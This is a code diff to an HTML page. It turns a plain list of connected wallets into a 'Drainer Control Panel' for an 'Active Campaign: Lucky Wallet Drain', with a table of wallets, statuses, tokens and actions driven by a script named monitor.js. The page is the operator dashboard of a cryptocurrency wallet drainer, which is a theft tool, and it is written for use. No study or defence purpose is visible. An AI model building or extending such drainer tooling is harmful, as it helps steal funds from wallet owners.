@@ -1,14 +1,25 @@
-<h2>Connected Wallets</h2>
-<ul id="wallets"></ul>
-<script>
-  fetch("http://localhost:5000/wallets")
-    .then(res => res.json())
-    .then(data => {
-      const list = document.getElementById("wallets");
-      data.wallets.forEach(wallet => {
-        const li = document.createElement("li");
-        li.innerText = `${wallet.address} - ${wallet.status}`;
-        list.appendChild(li);
-      });
-    });
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>💀 Drainer Admin Panel</title>
+  <link rel="stylesheet" href="https://cdn.simplecss.org/simple.css">
+</head>
+<body>
+  <h1>Drainer Control Panel</h1>
+  <p>Active Campaign: Lucky Wallet Drain</p>
+
+  <table id="walletTable">
+    <thead>
+      <tr>
+        <th>Wallet</th>
+        <th>Status</th>
+        <th>Tokens</th>
+        <th>Action</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+  <script src="monitor.js"></script>
+</body>
+</html>
